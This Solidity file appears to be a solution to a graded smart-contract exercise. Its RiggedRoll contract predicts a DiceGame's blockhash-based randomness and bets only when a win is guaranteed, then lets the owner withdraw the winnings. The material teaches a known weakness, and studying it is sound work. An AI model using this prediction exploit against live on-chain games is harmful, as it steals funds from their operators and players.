pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
	DiceGame public diceGame;

	constructor(address payable diceGameAddress) {
		diceGame = DiceGame(diceGameAddress);
	}

	// Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
	function withdraw(address payable _to, uint256 _amount) public onlyOwner {
		(bool success,) = _to.call{ value: _amount }("");
    require(success, "Transfer failed.");
	}

	// Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
	function riggedRoll() public {
		uint256 roll = simulateRoll();

		console.log("\t", "   Rigged Dice Game Roll:", roll);
		require(roll <= 5, "You weren't going to win anyway!");
		require(
			address(this).balance >= 0.002 ether,
			"Insufficient balance to play the game"
		);

		diceGame.rollTheDice{ value: 0.002 ether }();
	}

	function simulateRoll() private view returns (uint256) {
		uint256 nonce = diceGame.nonce();
		bytes32 prevHash = blockhash(block.number - 1);
		bytes32 hash = keccak256(
			abi.encodePacked(prevHash, address(diceGame), nonce)
		);

		return uint256(hash) % 16;
	}

	// Include the `receive()` function to enable the contract to receive incoming Ether.
	receive() external payable {}
}
